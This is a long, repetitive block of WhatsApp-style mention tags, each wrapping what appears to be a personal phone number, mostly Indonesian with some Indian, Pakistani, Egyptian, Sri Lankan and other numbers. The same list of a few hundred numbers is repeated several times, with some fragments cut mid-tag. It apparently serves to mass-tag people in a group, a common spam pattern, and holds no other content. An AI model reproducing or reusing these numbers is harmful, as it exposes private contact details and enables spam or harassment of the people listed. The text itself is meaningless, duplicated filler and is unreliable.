~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~  ~_*@94786859370*_~ ~_*@6282189885009*_~ ~_*@62895338123500*_~ ~_*@6285866316854*_~ ~_*@201159634926*_~ ~_*@201158302336*_~ ~_*@6285348244140*_~ ~_*@6288212643727*_~ ~_*@6289604529240*_~ ~_*@923188794545*_~ ~_*@6282350181384*_~ ~_*@18655686614*_~ ~_*@6289519370667*_~ ~_*@60128617298*_~ ~_*@6283878849138*_~ ~_*@917400393728*_~ ~_*@2348170397144*_~ ~_*@6285730888458*_~ ~_*@6285895467588*_~ ~_*@994404688405*_~ ~_*@2347063484826*_~ ~_*@6287723518101*_~ ~_*@15402995426*_~ ~_*@923063049568*_~ ~_*@918607935816*_~ ~_*@6282351749689*_~ ~_*@94770576656*_~ ~_*@6283893040355*_~ ~_*@6285811422081*_~ ~_*@6285296476144*_~ ~_*@6281293580373*_~ ~_*@62895374180203*_~ ~_*@201050410103*_~ ~_*@967736206078*_~ ~_*@6285236219021*_~ ~_*@6289621588181*_~ ~_*@6289686158110*_~ ~_*@62881036169000*_~ ~_*@919539213231*_~ ~_*@917592017981*_~ ~_*@923444164397*_~ ~_*@6283849992226*_~ ~_*@6282268795060*_~ ~_*@6285389714695*_~ ~_*@994404932827*_~ ~_*@6283171419347*_~ ~_*@201143521095*_~ ~_*@6285881843277*_~ ~_*@6283863438481*_~ ~_*@6281288636847*_~ ~_*@12199129598*_~ ~_*@6281539383753*_~ ~_*@62812498405442*_~ ~_*@6285748134061*_~ ~_*@6281256133894*_~ ~_*@6281211620277*_~ ~_*@16013016141*_~ ~_*@918714485001*_~ ~_*@994405134976*_~ ~_*@6281369684262*_~ ~_*@923422178323*_~ ~_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~  ~_*@94786859370*_~ ~_*@6282189885009*_~ ~_*@62895338123500*_~ ~_*@6285866316854*_~ ~_*@201159634926*_~ ~_*@201158302336*_~ ~_*@6285348244140*_~ ~_*@6288212643727*_~ ~_*@6289604529240*_~ ~_*@923188794545*_~ ~_*@6282350181384*_~ ~_*@18655686614*_~ ~_*@6289519370667*_~ ~_*@60128617298*_~ ~_*@6283878849138*_~ ~_*@917400393728*_~ ~_*@2348170397144*_~ ~_*@6285730888458*_~ ~_*@6285895467588*_~ ~_*@994404688405*_~ ~_*@2347063484826*_~ ~_*@6287723518101*_~ ~_*@15402995426*_~ ~_*@923063049568*_~ ~_*@918607935816*_~ ~_*@6282351749689*_~ ~_*@94770576656*_~ ~_*@6283893040355*_~ ~_*@6285811422081*_~ ~_*@6285296476144*_~ ~_*@6281293580373*_~ ~_*@62895374180203*_~ ~_*@201050410103*_~ ~_*@967736206078*_~ ~_*@6285236219021*_~ ~_*@6289621588181*_~ ~_*@6289686158110*_~ ~_*@62881036169000*_~ ~_*@919539213231*_~ ~_*@917592017981*_~ ~_*@923444164397*_~ ~_*@6283849992226*_~ ~_*@6282268795060*_~ ~_*@6285389714695*_~ ~_*@994404932827*_~ ~_*@6283171419347*_~ ~_*@201143521095*_~ ~_*@6285881843277*_~ ~_*@6283863438481*_~ ~_*@6281288636847*_~ ~_*@12199129598*_~ ~_*@6281539383753*_~ ~_*@62812498405442*_~ ~_*@6285748134061*_~ ~_*@6281256133894*_~ ~_*@6281211620277*_~ ~_*@16013016141*_~ ~_*@918714485001*_~ ~_*@994405134976*_~ ~_*@6281369684262*_~ ~_*@923422178323*_~ ~_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~  ~_*@94786859370*_~ ~_*@6282189885009*_~ ~_*@62895338123500*_~ ~_*@6285866316854*_~ ~_*@201159634926*_~ ~_*@201158302336*_~ ~_*@6285348244140*_~ ~_*@6288212643727*_~ ~_*@6289604529240*_~ ~_*@923188794545*_~ ~_*@6282350181384*_~ ~_*@18655686614*_~ ~_*@6289519370667*_~ ~_*@60128617298*_~ ~_*@6283878849138*_~ ~_*@917400393728*_~ ~_*@2348170397144*_~ ~_*@6285730888458*_~ ~_*@6285895467588*_~ ~_*@994404688405*_~ ~_*@2347063484826*_~ ~_*@6287723518101*_~ ~_*@15402995426*_~ ~_*@923063049568*_~ ~_*@918607935816*_~ ~_*@6282351749689*_~ ~_*@94770576656*_~ ~_*@6283893040355*_~ ~_*@6285811422081*_~ ~_*@6285296476144*_~ ~_*@6281293580373*_~ ~_*@62895374180203*_~ ~_*@201050410103*_~ ~_*@967736206078*_~ ~_*@6285236219021*_~ ~_*@6289621588181*_~ ~_*@6289686158110*_~ ~_*@62881036169000*_~ ~_*@919539213231*_~ ~_*@917592017981*_~ ~_*@923444164397*_~ ~_*@6283849992226*_~ ~_*@6282268795060*_~ ~_*@6285389714695*_~ ~_*@994404932827*_~ ~_*@6283171419347*_~ ~_*@201143521095*_~ ~_*@6285881843277*_~ ~_*@6283863438481*_~ ~_*@6281288636847*_~ ~_*@12199129598*_~ ~_*@6281539383753*_~ ~_*@62812498405442*_~ ~_*@6285748134061*_~ ~_*@6281256133894*_~ ~_*@6281211620277*_~ ~_*@16013016141*_~ ~_*@918714485001*_~ ~_*@994405134976*_~ ~_*@6281369684262*_~ ~_*@923422178323*_~ ~_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~
_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~
_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ 